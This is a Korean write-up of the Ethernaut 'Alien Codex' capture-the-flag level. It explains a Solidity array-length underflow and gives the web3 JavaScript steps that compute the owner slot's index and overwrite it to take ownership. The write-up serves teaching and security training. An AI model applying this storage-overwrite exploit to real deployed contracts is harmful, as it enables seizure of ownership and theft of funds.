# Ethernaut Level 19 - Alien Codex

## 문제 설명

동적 배열의 스토리지 슬롯 언더플로우를 이용해 소유권을 탈취하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract AlienCodex is Ownable {
    bool public contact;       // slot 0 (owner와 패킹)
    bytes32[] public codex;    // slot 1 (length), 데이터는 keccak256(1)부터

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) contacted public {
        codex.push(_content);
    }

    function retract() contacted public {
        codex.length--;  // ← 언더플로우!
    }

    function revise(uint i, bytes32 _content) contacted public {
        codex[i] = _content;
    }
}
```

---

## 취약점 분석

### 1. 배열 언더플로우

`retract()` 호출 시 `codex.length`가 0이면 언더플로우 발생

```
0 - 1 = 2^256 - 1
```

→ `codex`의 길이가 `2^256 - 1`이 되어 스토리지의 **모든 슬롯**에 접근 가능

### 2. Storage 레이아웃

```
slot 0      : owner (20 bytes) + contact (1 byte) 패킹
slot 1      : codex.length
slot k      : codex 데이터 시작 (k = keccak256(1))
```

### 3. owner 슬롯 인덱스 계산

```
codex 데이터 시작 슬롯: p = keccak256(1)
owner가 있는 슬롯: 0

필요한 인덱스 i:
p + i ≡ 0 (mod 2^256)
i = 2^256 - p
```

→ `codex[i]`가 slot 0 (owner)을 가리킴

---

## 공격 단계

### Step 1 — contact 활성화

```js
await contract.makeContact()
```

### Step 2 — 배열 언더플로우

```js
await contract.retract()
```

### Step 3 — owner 슬롯 인덱스 계산

```js
let p = web3.utils.keccak256(
    web3.eth.abi.encodeParameter("uint256", 1)
)
let index = BigInt(2 ** 256) - BigInt(p)
```

### Step 4 — owner 슬롯 덮어쓰기

```js
// player 주소를 32바이트로 패딩
let newOwner = "0x" + "0".repeat(24) + player.slice(2)
await contract.revise(index, newOwner)
```

### Step 5 — 확인

```js
await contract.owner()
// → 내 지갑 주소
```

---

## 핵심 교훈

- 동적 배열 길이 감소 시 언더플로우 주의 (Solidity 0.8.0 이전)
- 배열 인덱스 범위 검증 부재로 임의 스토리지 쓰기 가능
- Solidity 0.8.0 이상에서는 자동으로 revert됨
- 배열 길이를 직접 조작하는 코드는 절대 사용 금지
